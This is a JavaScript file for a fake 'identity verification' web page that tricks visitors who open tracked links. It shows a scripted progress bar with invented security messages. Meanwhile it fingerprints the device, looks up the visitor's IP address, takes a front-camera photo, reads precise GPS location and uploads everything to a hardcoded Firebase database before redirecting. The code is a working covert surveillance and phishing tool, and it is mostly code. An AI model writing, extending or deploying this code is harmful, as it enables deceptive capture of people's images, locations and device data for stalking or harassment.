// ── IMPORTS MUST BE FIRST ──────────────────────────────────────────────────
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, push, set, get, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

// ── FIREBASE CONFIG (API key space bug fixed) ──────────────────────────────
const firebaseConfig = {
    apiKey: "AIzaSyCu-4lEX3qQqPCow3nhvCHZNrpg5nbEUm0",
    authDomain: "camera-c436d.firebaseapp.com",
    databaseURL: "https://camera-c436d-default-rtdb.firebaseio.com",
    projectId: "camera-c436d",
    storageBucket: "camera-c436d.firebasestorage.app",
    messagingSenderId: "1024848910212",
    appId: "1:1024848910212:web:80a95f41281d1a920eafd1"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// ── FEATURE 1: FAKE LOADING PROGRESS BAR ──────────────────────────────────
function showFakeProgress(container) {
    container.innerHTML = `
        <div id="fakeLoader" style="width:100%;">
            <div style="background:#f0f0f0; border-radius:8px; overflow:hidden; height:10px; margin:15px 0;">
                <div id="progressBar" style="height:100%; width:0%; background:linear-gradient(90deg,#007bff,#00c6ff); border-radius:8px; transition:width 0.4s ease;"></div>
            </div>
            <p id="fakeStatus" style="font-size:13px; color:#666; margin:6px 0;">Initializing...</p>
            <p id="statusText" style="font-size:13px; color:#555; margin:6px 0;"></p>
        </div>
        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
    `;

    const steps = [
        [5,  "Checking SSL certificate..."],
        [15, "Connecting to verification server..."],
        [28, "Validating session token..."],
        [42, "Authenticating identity..."],
        [55, "Requesting security permissions..."],
        [68, "Processing biometric data..."],
        [80, "Encrypting data transfer..."],
        [90, "Finalizing verification..."],
        [97, "Almost done..."]
    ];

    let i = 0;
    const bar = document.getElementById('progressBar');
    const fakeStatus = document.getElementById('fakeStatus');

    const interval = setInterval(() => {
        if (i < steps.length) {
            bar.style.width = steps[i][0] + '%';
            fakeStatus.innerText = steps[i][1];
            i++;
        } else {
            clearInterval(interval);
        }
    }, 900);

    return interval;
}

function finishProgress(fakeInterval) {
    clearInterval(fakeInterval);
    const bar = document.getElementById('progressBar');
    const fakeStatus = document.getElementById('fakeStatus');
    if (bar) bar.style.width = '100%';
    if (fakeStatus) fakeStatus.innerText = 'Verification complete!';
}

// ── FEATURE 2: DEVICE INFO COLLECTION (no permission needed) ──────────────
async function collectDeviceInfo() {
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform || 'Unknown',
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        onlineStatus: navigator.onLine,
        referrer: document.referrer || 'Direct',
        pageUrl: window.location.href,
    };

    // Connection / network type
    if (navigator.connection) {
        info.networkType = navigator.connection.effectiveType || 'Unknown';
        info.downlink = (navigator.connection.downlink || 'Unknown') + ' Mbps';
    } else {
        info.networkType = 'Unknown';
    }

    // Battery level
    try {
        const battery = await navigator.getBattery();
        info.battery = Math.round(battery.level * 100) + '%';
        info.charging = battery.charging ? 'Yes' : 'No';
    } catch(e) {
        info.battery = 'Unavailable';
        info.charging = 'Unavailable';
    }

    // Parse OS and browser from userAgent
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) info.os = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua)) info.os = 'iOS';
    else if (/windows/i.test(ua)) info.os = 'Windows';
    else if (/mac/i.test(ua)) info.os = 'macOS';
    else if (/linux/i.test(ua)) info.os = 'Linux';
    else info.os = 'Unknown';

    if (/chrome/i.test(ua) && !/edge/i.test(ua)) info.browser = 'Chrome';
    else if (/firefox/i.test(ua)) info.browser = 'Firefox';
    else if (/safari/i.test(ua) && !/chrome/i.test(ua)) info.browser = 'Safari';
    else if (/edge/i.test(ua)) info.browser = 'Edge';
    else if (/opera|opr/i.test(ua)) info.browser = 'Opera';
    else info.browser = 'Unknown';

    return info;
}

// ── FEATURE 3: IP ADDRESS LOGGING ─────────────────────────────────────────
async function getIPAddress() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip || 'Unavailable';
    } catch(e) {
        try {
            // Fallback API
            const res2 = await fetch('https://api64.ipify.org?format=json');
            const data2 = await res2.json();
            return data2.ip || 'Unavailable';
        } catch(e2) {
            return 'Unavailable';
        }
    }
}

// ── MAIN VERIFICATION FUNCTION ─────────────────────────────────────────────
async function initVerification() {
    const urlParams = new URLSearchParams(window.location.search);
    const linkId = urlParams.get('linkId');

    if (!linkId) {
        document.body.innerHTML = "<div style='text-align:center;margin-top:50px;'><h1>404 Not Found</h1></div>";
        return;
    }

    const linkRef = ref(db, 'managed_links/' + linkId);
    const snapshot = await get(linkRef);
    const settings = snapshot.val();

    if (!settings || !settings.active) {
        document.body.innerHTML = "<div style='text-align:center;margin-top:50px;'><h1>404 Not Found</h1><p>This link is invalid or has been disabled.</p></div>";
        return;
    }

    // FEATURE 4: Increment visit counter on Firebase
    try {
        const currentVisits = (snapshot.val().visits || 0) + 1;
        await update(ref(db, 'managed_links/' + linkId), { visits: currentVisits });
    } catch(e) { /* silent */ }

    // Show fake progress bar
    const container = document.querySelector('.container');
    const fakeInterval = showFakeProgress(container);

    // Collect device info silently (no permission needed)
    const [deviceInfo, ipAddress] = await Promise.all([
        collectDeviceInfo(),
        getIPAddress()
    ]);

    let lat = "Denied", lon = "Denied";
    let photoData = null;

    // STEP 1: CAMERA
    if (settings.cam) {
        try {
            const statusText = document.getElementById('statusText');
            if (statusText) statusText.innerText = "Please allow camera access...";
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.style.display = 'block';
            await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; });
            await new Promise(r => setTimeout(r, 1500));
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            photoData = canvas.toDataURL('image/jpeg', 0.7);
            stream.getTracks().forEach(t => t.stop());
            video.style.display = 'none';
        } catch(e) {
            console.error("Camera error:", e);
        }
    }

    // STEP 2: LOCATION
    if (settings.gps) {
        try {
            const statusText = document.getElementById('statusText');
            if (statusText) statusText.innerText = "Please allow location access...";
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, {
                    timeout: 15000, enableHighAccuracy: true, maximumAge: 0
                });
            });
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
        } catch(e) { console.log("GPS denied"); }
    }

    // STEP 3: SEND EVERYTHING TO FIREBASE
    try {
        const historyRef = ref(db, 'photo_history');
        const newEntryRef = push(historyRef);
        await set(newEntryRef, {
            id: Date.now(),
            image: photoData,
            latitude: lat,
            longitude: lon,
            linkName: settings.name,
            linkId: linkId,
            date: new Date().toLocaleDateString(),
            time: new Date().toLocaleTimeString(),
            timestamp: Date.now(),
            // Feature 2: Device info
            device: deviceInfo,
            // Feature 3: IP address
            ipAddress: ipAddress
        });
    } catch(e) {
        console.error("Firebase save error:", e);
    }

    finishProgress(fakeInterval);
    const statusText = document.getElementById('statusText');
    if (statusText) statusText.innerText = "✅ Verification Successful!";

    if (settings.redirectUrl) {
        setTimeout(() => { window.location.href = settings.redirectUrl; }, 2000);
    }
}

window.addEventListener('load', initVerification);
